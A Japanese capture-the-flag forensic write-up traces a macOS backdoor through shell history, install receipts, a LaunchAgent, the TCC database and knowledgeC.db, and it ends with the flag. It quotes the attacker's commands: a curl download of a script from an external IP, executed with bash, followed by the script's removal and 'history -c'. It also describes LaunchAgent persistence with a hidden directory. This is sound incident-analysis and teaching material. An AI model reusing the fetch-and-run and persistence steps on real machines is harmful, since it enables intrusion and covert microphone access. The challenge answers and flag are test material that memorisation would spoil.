# Case 02 Write-up: 潜伏するバックドア

## Q1. 不審なコマンドの実行時刻とダウンロード元URL

```sh
cat "evidence/Users/bob/.zsh_sessions/501_ttys001.history"
```

```
: 1722606603:0;curl -s http://185.220.101.7/update.sh -o /tmp/update.sh
: 1722606607:0;bash /tmp/update.sh
: 1722606720:0;rm /tmp/update.sh
: 1722606755:0;history -c
```

`curl` の行のタイムスタンプ `1722606603` をUTCに変換する。

```sh
python3 -c "import datetime; print(datetime.datetime.utcfromtimestamp(1722606603))"
# 2024-08-02 13:50:03
```

その後 `bash /tmp/update.sh` でスクリプトを即実行し、証拠隠滅のために
`rm` と `history -c`（履歴削除）まで行っている点も不審。

**答え: `13:50:03`、`http://185.220.101.7/update.sh`**

## Q2. インストールされたパッケージとインストール時刻

```sh
plutil -p "evidence/Library/Receipts/InstallHistory.plist"
```

```
{
  0 => {
    "date" => "2024-08-02 13:50:41 +0000"
    "displayName" => "update helper"
    "packageIdentifiers" => ["com.update.helper"]
    "processName" => "update.sh"
  }
}
```

`processName` が `update.sh` と、Q1で実行されたスクリプトと一致している。

**答え: `com.update.helper`、`13:50:41`**

## Q3. 永続化の仕組み

```sh
plutil -p "evidence/Users/bob/Library/LaunchAgents/com.update.helper.plist"
```

```
{
  "KeepAlive" => 1
  "Label" => "com.update.helper"
  "ProgramArguments" => [
    "/Users/bob/Library/Application Support/.helperd/helperd"
  ]
  "RunAtLoad" => 1
}
```

`~/Library/LaunchAgents/com.update.helper.plist` というLaunchAgentが設置されている。
`RunAtLoad: true` によりbobがログインする度に自動的に起動し、`KeepAlive: true` に
よりプロセスが落ちても`launchd`が再起動させる。隠しディレクトリ `.helperd/` に
実行ファイルを置いているのもマルウェアらしい特徴。

**答え: パス `~/Library/LaunchAgents/com.update.helper.plist`、
`RunAtLoad` キーがtrueになっているため自動起動する**

## Q4. TCC権限と許可時刻

```sh
sqlite3 "evidence/Library/Application Support/com.apple.TCC/TCC.db" \
  "select service, client, last_modified from access;"
```

```
kTCCServiceCamera|com.apple.FaceTime|744100000
kTCCServiceMicrophone|com.update.helper|744299480
```

`com.update.helper` に付与されているのは `kTCCServiceMicrophone`（マイク）。

```sh
python3 -c "import datetime; print(datetime.datetime.utcfromtimestamp(978307200 + 744299480))"
# 2024-08-02 13:51:20
```

**答え: `kTCCServiceMicrophone`、`13:51:20`**

## Q5. 再ログインから起動までの時間

```sh
cat "evidence/private/var/log/system.log"
```

```
[utmpx] BOOT_TIME:     Fri Aug  2 08:40:00 2024
[utmpx] USER_PROCESS:  bob     console  Fri Aug  2 08:41:30 2024
[utmpx] BOOT_TIME:     Sat Aug  3 08:29:50 2024
[utmpx] USER_PROCESS:  bob     console  Sat Aug  3 08:30:05 2024
```

翌日(8/3)、bobは `08:30:05` にログインしている。

```sh
sqlite3 "evidence/Users/bob/Library/Application Support/Knowledge/knowledgeC.db" \
  "select ZVALUESTRING, ZSTARTDATE, ZENDDATE from ZOBJECT where ZSTARTDATE > 744360000;"
```

```
com.apple.finder|744366720.0|744366760.0
com.update.helper|744366609.0|744366900.0
```

`com.update.helper` の開始時刻 `744366609` をUnix時間に変換すると

```sh
python3 -c "import datetime; print(datetime.datetime.utcfromtimestamp(978307200 + 744366609))"
# 2024-08-03 08:30:09
```

ログイン(`08:30:05`)から起動(`08:30:09`)までわずか **4秒**。人間がログイン直後の
4秒でアプリを探して手動起動するのは現実的でなく、`RunAtLoad` によって
`launchd` がログインと同時に自動起動したと考えるのが妥当。さらにこの起動は
bobが実際に使った`Finder`（`08:32:00`起動）よりも早く、bob自身の操作ではないことを
裏付ける。

**答え: 4秒。この短さから、bobが手動で起動したのではなく、
LaunchAgentのRunAtLoadによってログインと同時に自動起動したと判断できる**

## Q6. フラグ

| 時刻(UTC) | 出来事 | 証拠 |
|---|---|---|
| 2024-08-02 13:50:03 | 不審なURLからスクリプトをダウンロード | .zsh_sessions history |
| 2024-08-02 13:50:07 | スクリプトを実行 | .zsh_sessions history |
| 2024-08-02 13:50:41 | `com.update.helper` パッケージがインストールされる | InstallHistory.plist |
| 2024-08-02 13:51:20 | `com.update.helper` にマイク権限(TCC)が付与される | TCC.db |
| 2024-08-02 13:52:10 | `com.update.helper` が初回起動 | knowledgeC.db |
| 2024-08-03 08:30:05 | bobが再ログイン | system.log |
| 2024-08-03 08:30:09 | ログイン4秒後に`com.update.helper`が自動再起動（永続化を確認） | knowledgeC.db |

不審なURLからのダウンロード→即実行→インストール→LaunchAgentによる永続化設置→
マイク権限の取得→再起動後もRunAtLoadによって自動的に生き残り続ける、という
典型的なmacOSバックドアの一連の流れが揃っている。

**フラグ: `flag{2024-08-02_13:51:20_com.update.helper}`**
